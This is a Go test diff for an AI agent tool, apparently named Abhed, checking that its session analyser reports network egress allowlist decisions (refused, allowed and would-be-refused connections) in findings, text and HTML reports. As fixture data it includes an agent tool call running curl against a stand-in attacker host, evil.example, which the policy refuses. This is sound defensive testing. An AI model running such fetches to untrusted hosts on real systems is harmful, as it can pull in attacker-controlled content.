@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"github.com/zybuu-ai/abhed/internal/agent"
+	"github.com/zybuu-ai/abhed/internal/egress"
 )
 
 // rec builds a session record one event at a time, the way the loop writes it.
@@ -594,5 +595,59 @@ func TestSuggestionTokensCountInTheTotals(t *testing.T) {
 	got := Analyze("s-test", r.evs)
 	if got.Totals.Turns != 1 || got.Totals.TokensIn != 1300 || got.Totals.TokensOut != 70 || got.Totals.ModelMS != 1000 {
 		t.Fatalf("totals %+v", got.Totals)
+	}
+}
+
+// The egress allowlist's decisions are read from egress.decision, not guessed
+// from a command's output: a command that printed nothing about it and exited
+// 0 is still shown as refused by the network, with the destination named.
+func TestEgressDecisionsAreReported(t *testing.T) {
+	dec := func(ev egress.Event) map[string]any { return ev.Payload() }
+	r := (&rec{}).user("fetch the release")
+	r.add(agent.EvActionRequested, agent.ActorAgent, agent.Trusted, agent.ActionRequested{CallID: "c1", Tool: "bash", Args: json.RawMessage(`{"command":"curl -s https://evil.example/x || true"}`)})
+	r.add(agent.EvActionApproved, agent.ActorSystem, agent.Trusted, map[string]string{"call_id": "c1", "step": "allow", "by": "policy"})
+	r.add(agent.EvEgressDecision, agent.ActorSystem, agent.Trusted, dec(egress.Event{CallID: "c1", Kind: "connect", Host: "evil.example", Port: 443, Decision: egress.Deny, Rule: "default", Reason: "no rule allows it"}))
+	r.add(agent.EvEgressDecision, agent.ActorSystem, agent.Trusted, dec(egress.Event{Kind: "connect", Host: "evil.example", Port: 443, Decision: egress.Deny, Rule: "default", Repeats: 2}))
+	r.add(agent.EvEgressDecision, agent.ActorSystem, agent.Trusted, dec(egress.Event{CallID: "c1", Kind: "connect", Host: "proxy.golang.org", Port: 443, Decision: egress.Allow, Rule: "rules[0]"}))
+	r.add(agent.EvObservation, agent.ActorTool, agent.Untrusted, agent.Observation{CallID: "c1", Tool: "bash", Content: "", Sandbox: "process"})
+	r.add(agent.EvEgressDecision, agent.ActorSystem, agent.Trusted, dec(egress.Event{Kind: "web_fetch", Host: "tracker.example", Port: 443, Decision: egress.Deny, Rule: "default"}))
+	r.add(agent.EvEgressDecision, agent.ActorSystem, agent.Trusted, dec(egress.Event{CallID: "c1", Kind: "http", Host: "mon.example", Port: 80, Method: "GET", Path: "/a", Decision: egress.WouldDeny, Rule: "default"}))
+	r.end(agent.TermCompleted)
+
+	got := Analyze("s-test", r.evs)
+	n := got.Network
+	if n == nil || n.Allowed != 1 || n.Denied != 4 || n.WouldDeny != 1 {
+		t.Fatalf("network totals: %+v", n)
+	}
+	if got.Policy.Denied != 0 || len(got.Calls) != 1 || got.Calls[0].NetworkDenied != 1 {
+		t.Fatalf("the call: %+v, policy %+v", got.Calls, got.Policy)
+	}
+	var denied, would []Finding
+	for _, f := range got.Findings {
+		switch f.Code {
+		case "network-denied":
+			denied = append(denied, f)
+		case "network-would-deny":
+			would = append(would, f)
+		}
+	}
+	if len(denied) != 3 || !strings.Contains(denied[0].Title, "evil.example:443") || !strings.Contains(denied[0].Detail, "curl -s") ||
+		!strings.Contains(denied[1].Detail, "commands in this session") || !strings.Contains(denied[1].Detail, "2 times") ||
+		!strings.Contains(denied[2].Detail, "Abhed's own web_fetch request") {
+		t.Fatalf("network-denied findings: %+v", denied)
+	}
+	if len(would) != 1 || !strings.Contains(would[0].Detail, "GET /a") {
+		t.Fatalf("would-deny findings: %+v", would)
+	}
+	text := Text(got)
+	if !strings.Contains(text, "network   1 allowed · 4 refused · 1 would be refused") || !strings.Contains(text, "! #") {
+		t.Fatalf("text report:\n%s", text)
+	}
+	if html, err := HTML(got); err != nil || !strings.Contains(html, "network refused 1") {
+		t.Fatalf("html report: %v", err)
+	}
+	// A record without egress decisions says nothing about the network.
+	if plain := Analyze("s-test", (&rec{}).user("x").call("c1", "bash", `{"command":"ls"}`, "allow", "a", false).end(agent.TermCompleted).evs); plain.Network != nil || strings.Contains(Text(plain), "  network   ") {
+		t.Fatalf("network reported without decisions: %+v", plain.Network)
 	}
 }
